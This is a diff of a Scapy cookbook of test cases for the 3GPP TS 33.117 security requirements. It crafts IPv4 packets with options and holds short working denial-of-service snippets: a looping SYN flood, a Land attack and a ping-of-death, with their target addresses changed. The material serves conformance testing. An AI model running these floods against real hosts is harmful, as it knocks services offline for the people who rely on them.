@@ -1,8 +1,7 @@
 # security-assurance-test-cookbook-with-Scapy
 This cookbook is for test cases of security assurance requirements defined in 3GPP TS 33.117. All test cases are based on Scapy tool.
 
-# -------------------------------------------------------------------------------------------------------------------------------------------
-# Cover IPv4 options in RFC791
+# Cover IPv4 options in RFC791 - Start
 # Create packet with NOP option
 opt=IP(src="10.234.56.78",dst="10.98.76.54",options=b'\x01\x00')
 opt=IP(src="10.234.56.78",dst="10.98.76.54",options=[IPOption_NOP(), IPOption_EOL()])
@@ -89,10 +88,11 @@ opt=IP(src="10.234.56.78",dst="224.0.0.254",options=b'\x1d\x08\x00\x00\x00\x00')
 opt=IPv6ExtHdrHopByHop()
 
 opt=IP(src="10.234.56.78",dst="10.98.76.54",options=b'\x97\x04\xde\xad\x00')
+# Cover IPv4 options in RFC791 - End
 
-# -------------------------------------------------------------------------------------------------------------------------------------------
+# Cover common DOS attack - Start
 # SYN flooding attack
-target_ip="10.96.106.82"
+target_ip="10.234.56.78"
 target_port=8002
 app=Raw(b"X"*1024)
 syn_flood=IP(dst=target_ip)/TCP(sport=RandShort(),dport=target_port,flags="S")/app
@@ -100,7 +100,7 @@ send(syn_flood, loop=1, verbose=0)
 
 
 # Land attack with target set to IP address of target host
-land=IP(src="10.96.106.82",dst="10.96.106.82")/TCP(sport=8002,dport=8002,flags="S")
+land=IP(src="10.234.56.78",dst="10.234.56.78")/TCP(sport=8002,dport=8002,flags="S")
 sendp(land, count=5)
 
 # Smurf attack
@@ -108,5 +108,7 @@ sendp(land, count=5)
 # Teardrop attack
 
 # Ping-of-death attack
-ping_of_death=fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000))
+ping_of_death=fragment(IP(dst="10.0.0.9")/ICMP()/("X"*60000))
 sendp(ping_of_death, 1000)
+
+# Cover common DOS attack - End
